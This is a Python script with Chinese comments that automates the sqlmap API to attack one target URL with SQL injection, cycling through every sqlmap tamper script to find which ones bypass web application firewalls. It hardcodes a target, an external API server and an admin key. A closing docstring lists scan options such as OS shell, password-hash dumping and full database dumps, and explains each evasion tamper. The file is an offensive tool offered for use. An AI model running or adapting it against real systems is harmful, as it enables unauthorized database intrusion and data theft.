#-*-coding:utf-8-*-
import os
import re
import requests
import time
import json
import subprocess
from threading import Thread


class AutoSqli(object):
 
    """
    使用sqlmapapi的方法进行与sqlmapapi建立的server进行交互

    """
 
    def __init__(self, server='', target='', tamper = '',data = '',referer = '',cookie = ''):
        super(AutoSqli, self).__init__()
        self.server = server
        if self.server[-1] != '/':
            self.server = self.server + '/'
        self.target = target
        self.tamper = tamper
        self.taskid = ''
        self.engineid = ''
        self.status = ''
        self.data = data
        self.referer = referer
        self.cookie = cookie
        self.start_time = time.time()
 
    #新建扫描任务    
    def task_new(self):
        self.taskid = json.loads(
            requests.get(self.server + 'task/new').text)['taskid']
        print('[+] Created new task: ' + self.taskid)
        #得到taskid,根据这个taskid来进行其他的
        if len(self.taskid) > 0:
            return True
        return False
 
    #删除扫描任务
    def task_delete(self):
        if json.loads(requests.get(self.server + 'task/' + self.taskid + '/delete').text)['success']:
            print('[-] Delete Task [%s]\n\n' % (self.taskid))
            return True
        return False
 
    #扫描任务开始
    def scan_start(self):
        headers = {'Content-Type': 'application/json'}
        #需要扫描的地址
        payload = {'url': self.target}
        url = self.server + 'scan/' + self.taskid + '/start'
        #http://127.0.0.1:8557/scan/xxxxxxxxxx/start
        t = json.loads(
            requests.post(url, data=json.dumps(payload), headers=headers).text)
        self.engineid = t['engineid']
        if len(str(self.engineid)) > 0 and t['success']:
            print('[*] Started Scan Use Tamper: ' + self.tamper)
            print('[*] Task log url is: \033[1;33m' + self.server + 'scan/' + self.taskid + '/log\033[0m')
            return True
        return False
 
    #扫描任务的状态
    def scan_status(self):
        self.status = json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/status').text)['status']
        if self.status == 'running':
            return 'running'
        elif self.status == 'terminated':
            return 'terminated'
        else:
            return 'error'
 
    #扫描任务的细节
    def scan_data(self):
        self.data = json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/data').text)['data']
        if len(self.data) == 0:
            print('\033[1;31m[E] Can not injection!\033[0m\t')
        else:
            print('\033[1;32m[S] Injection:\t' + self.target + "\tThe Tamper is: [" + self.tamper + "]\033[0m")
            useful.append(self.tamper)
 
    #扫描的设置,主要的是参数的设置
    def option_set(self):
        headers = {'Content-Type': 'application/json'}

        option =  {
                "smart": True,
                "batch": True,
                "randomAgent": True,
                "safeUrl": self.target,
                "safeFreq": 1,
                #"level": 3,
                "threads": 6,
                "tamper": self.tamper,
                "freshQueries": True,  #忽略存储在会话文件中的查询结果
                "flushSession": True   #刷新本地Session


                }  

        url = self.server + 'option/' + self.taskid + '/set'
        requests.post(url, data=json.dumps(option), headers=headers)
        
 
    #停止扫描任务
    def scan_stop(self):
        json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/stop').text)['success']
 
    #杀死扫描任务进程
    def scan_kill(self):
        json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/kill').text)['success']
 
    def run(self):
        if not self.task_new():
            return False
        self.option_set()
        if not self.scan_start():
            return False
        while True:
            if self.scan_status() == 'running':
                time.sleep(10)
            elif self.scan_status() == 'terminated':
                break
            else:
                break
            #print(time.time() - self.start_time)
            if time.time() - self.start_time > 3000:
                error = True
                self.scan_stop()
                self.scan_kill()
                break
        self.scan_data()       
        self.task_delete()
        #print(time.time() - self.start_time)

    def test(self):
        self.task_new()
        self.option_set()
        self.scan_start()


 
if __name__ == '__main__':





    #------------------------------------------------------------------------------------------------------


    #tamper_path = r"C:/Users/zzz/Desktop/sqlmap/tamper/" # Sqlmap Tmaper Path
    sqlmap_api = "http://api.z0z.me/sqlmap" # Api URL. eg: http://api.z0z.me:8000  如何运行sqlmap api 请看下面注释 
    url = "http://192.168.2.32:8088/general/vote/show/read_vote.php?VOTE_ID=1" # Testing Url
    user_tamper = []   #自定义Tamper 采用list格式填写 eg: ["1.py","2.py",...,"n.py"]

    admin_key = "2e4585c3776fcbdcfa72276d80134d88" # 如不使用调试函数可不填



    #------------------------------------------------------------------------------------------------------





    # 处理 tamper name
    #tamper_names = os.listdir(tamper_path)
    #tamper_names.remove('__init__.py')
    tamper_names = []
    tamper_names = ['apostrophemask.py', 'apostrophenullencode.py', 'appendnullbyte.py', 'base64encode.py', 'between.py', 'bluecoat.py', 'chardoubleencode.py', 'charencode.py', 'charunicodeencode.py', 'commalesslimit.py', 'commalessmid.py', 'commentbeforeparentheses.py', 'concat2concatws.py', 'equaltolike.py', 'escapequotes.py', 'greatest.py', 'halfversionedmorekeywords.py', 'htmlencode.py', 'ifnull2ifisnull.py', 'informationschemacomment.py', 'lowercase.py', 'modsecurityversioned.py', 'modsecurityzeroversioned.py', 'multiplespaces.py', 'nonrecursivereplacement.py', 'overlongutf8.py', 'percentage.py', 'plus2concat.py', 'plus2fnconcat.py', 'randomcase.py', 'randomcomments.py', 'securesphere.py', 'space2comment.py', 'space2dash.py', 'space2hash.py', 'space2morecomment.py', 'space2morehash.py', 'space2mssqlblank.py', 'space2mssqlhash.py', 'space2mysqlblank.py', 'space2mysqldash.py', 'space2plus.py', 'space2randomblank.py', 'sp_password.py', 'symboliclogical.py', 'unionalltounion.py', 'unmagicquotes.py', 'uppercase.py', 'varnish.py', 'versionedkeywords.py', 'versionedmorekeywords.py', 'xforwardedfor.py']
    
    # 加入用户自定义的tamper
    for x in user_tamper:
        tamper_names.append(x)
    useful = []
 

    def exec_sms(tamper_names):

        for x in tamper_names:

            tmp = AutoSqli( sqlmap_api, url, x)
            t=Thread(target=tmp.run())  
            t.setDaemon(True)  
            t.start() 
          
        t.join()

        print("[-] Created Task Done   Use All " + str(len(tamper_names)) + " tampers!")

        if len(useful)>0:

            print("\033[1;33m[S] Useful Tamper is : \033[0m\n")

            for x in useful:
                print("\033[1;32m[T] " + x + "\033[0m\n")
        else:

            print("\033[1;31m[E] No Tamper Can Use \033[0m")


    
    #------------------------------------------------------------------------------------------------------

    # 使用tamper创建所有任务 不自动删除
    def create_all(tamper_names):
        for x in tamper_names:
            x = AutoSqli( sqlmap_api, url, x)
            x.test()
            time.sleep(1)
        print("[*] Created Task Done   Use All " + str(len(tamper_names)) + " tampers!")


    # 删除所有任务
    def delete_all():
        requests.get(sqlmap_api+"/admin/"+admin_key+"/flush")
        print("[*] Delete Task Done")


    # 输出测试 详细信息输出本地 简要信息输出终端
    def ouput():
        t = json.loads(requests.get(sqlmap_api+"/admin/"+admin_key+"/list").content)["tasks"]
        with open('data', 'w') as f:
            for key in t:
                f.write(json.dumps(requests.get(sqlmap_api+"/scan/"+key+"/log").text)+"\n")
                print(requests.get(sqlmap_api+"/scan/"+key+"/data").text+"\n"+key+"\n\n")

    #------------------------------------------------------------------------------------------------------

    


    def main():
        
        
        exec_sms(tamper_names)


        #调试函数
        #create_all()
        #delete_all()
        #ouput()

    main()



    #------------------------------------------------------------------------------------------------------


    """
    参考文档: https://lightless.me/archives/sqlmapapi-basic-usage.html

    运行:python sqlmapapi.py -s

    默认运行在127.0.0.1:8775

    sqlmapapi optons:

    {
    "crawlDepth": None, 
    "osShell": False, 
    "getUsers": False, 
    "getPasswordHashes": False, 
    "excludeSysDbs": False, 
    "uChar": None, 
    "regData": None, 
    "cpuThrottle": 5, 
    "prefix": None, 
    "code": None, 
    "googlePage": 1, 
    "query": None, 
    "randomAgent": False, 
    "delay": 0, 
    "isDba": False, 
    "requestFile": None, 
    "predictOutput": False, 
    "wizard": False, 
    "stopFail": False, 
    "forms": False, 
    "taskid": "73674cc5eace4ac7", 
    "skip": None, 
    "dropSetCookie": False, 
    "smart": False, 
    "risk": 1, 
    "sqlFile": None, 
    "rParam": None, 
    "getCurrentUser": False, 
    "notString": None, 
    "getRoles": False, 
    "getPrivileges": False, 
    "testParameter": None, 
    "tbl": None, 
    "charset": None, 
    "trafficFile": None, 
    "osSmb": False, 
    "level": 1, 
    "secondOrder": None, 
    "pCred": None, 
    "timeout": 30, 
    "firstChar": None, 
    "updateAll": False, 
    "binaryFields": False, 
    "checkTor": False, 
    "aType": None, 
    "direct": None, 
    "saFreq": 0, 
    "tmpPath": None, 
    "titles": False, 
    "getSchema": False, 
    "identifyWaf": False, 
    "checkWaf": False, 
    "regKey": None, 
    "limitStart": None, 
    "loadCookies": None, 
    "dnsName": None, 
    "csvDel": ",", 
    "oDir": None, 
    "osBof": False, 
    "invalidLogical": False, 
    "getCurrentDb": False, 
    "hexConvert": False, 
    "answers": None, 
    "host": None, 
    "dependencies": False, 
    "cookie": None, 
    "proxy": None, 
    "regType": None, 
    "optimize": False, 
    "limitStop": None, 
    "mnemonics": None, 
    "uFrom": None, 
    "noCast": False, 
    "testFilter": None, 
    "eta": False, 
    "threads": 1, 
    "logFile": None, 
    "os": None, 
    "col": None, 
    "rFile": None, 
    "verbose": 1, 
    "aCert": None, 
    "torPort": None, 
    "privEsc": False, 
    "forceDns": False, 
    "getAll": False, 
    "api": True, 
    "url": None, 
    "invalidBignum": False, 
    "regexp": None, 
    "getDbs": False, 
    "freshQueries": False, 
    "uCols": None, 
    "smokeTest": False, 
    "pDel": None, 
    "wFile": None, 
    "udfInject": False, 
    "tor": False, 
    "forceSSL": False, 
    "beep": False, 
    "saveCmdline": False, 
    "configFile": None, 
    "scope": None, 
    "dumpAll": False, 
    "torType": "HTTP", 
    "regVal": None, 
    "dummy": False, 
    "commonTables": False, 
    "search": False, 
    "skipUrlEncode": False, 
    "referer": None, 
    "liveTest": False, 
    "purgeOutput": False, 
    "retries": 3, 
    "extensiveFp": False, 
    "dumpTable": False, 
    "database": "/tmp/sqlmapipc-EmjjlQ", 
    "batch": True, 
    "headers": None, 
    "flushSession": False, 
    "osCmd": None, 
    "suffix": None, 
    "dbmsCred": None, 
    "regDel": False, 
    "shLib": None, 
    "NoneConnection": False, 
    "timeSec": 5, 
    "msfPath": None, 
    "noEscape": False, 
    "getHostname": False, 
    "sessionFile": None, 
    "disableColoring": True, 
    "getTables": False, 
    "agent": None, 
    "lastChar": None, 
    "string": None, 
    "dbms": None, 
    "tamper": None, 
    "hpp": False, 
    "runCase": None, 
    "osPwn": False, 
    "evalCode": None, 
    "cleanup": False, 
    "getBanner": False, 
    "profile": False, 
    "regRead": False, 
    "bulkFile": None, 
    "safUrl": None, 
    "db": None, 
    "dumpFormat": "CSV", 
    "alert": None, 
    "user": None, 
    "parseErrors": False, 
    "aCred": None, 
    "getCount": False, 
    "dFile": None, 
    "data": None, 
    "regAdd": False, 
    "ignoreProxy": False, 
    "getColumns": False, 
    "mobile": False, 
    "googleDork": None, 
    "sqlShell": False, 
    "pageRank": False, 
    "tech": "BEUSTQ", 
    "textOnly": False, 
    "commonColumns": False, 
    "keepAlive": False
    }

    tampers:

    apostrophemask.py 用UTF-8全角字符替换单引号字符  
    apostrophenullencode.py 用非法双字节unicode字符替换单引号字符  
    appendnullbyte.py 在payload末尾添加空字符编码  
    base64encode.py 对给定的payload全部字符使用Base64编码  
    between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”  
    bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”  
    chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）  
    charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）  
    charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）  
    concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例  
    equaltolike.py 用“LIKE”运算符替换全部等于号“=”  
    greatest.py 用“GREATEST”函数替换大于号“>”  
    halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释  
    ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例  
    lowercase.py 用小写值替换每个关键字字符  
    modsecurityversioned.py 用注释包围完整的查询  
    modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询  
    multiplespaces.py 在SQL关键字周围添加多个空格  
    nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器  
    overlongutf8.py 转换给定的payload当中的所有字符  
    percentage.py 在每个字符之前添加一个百分号  
    randomcase.py 随机转换每个关键字字符的大小写  
    randomcomments.py 向SQL关键字中插入随机注释  
    securesphere.py 添加经过特殊构造的字符串  
    sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs  
    space2comment.py 用“/**/”替换空格符  
    space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符  
    space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符  
    space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符  
    space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符  
    space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符  
    space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符  
    space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符  
    space2plus.py 用加号“+”替换空格符  
    space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符  
    unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”  
    unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符  
    varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF  
    versionedkeywords.py 用MySQL注释包围每个非函数关键字  
    versionedmorekeywords.py 用MySQL注释包围每个关键字  
    xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF  
    """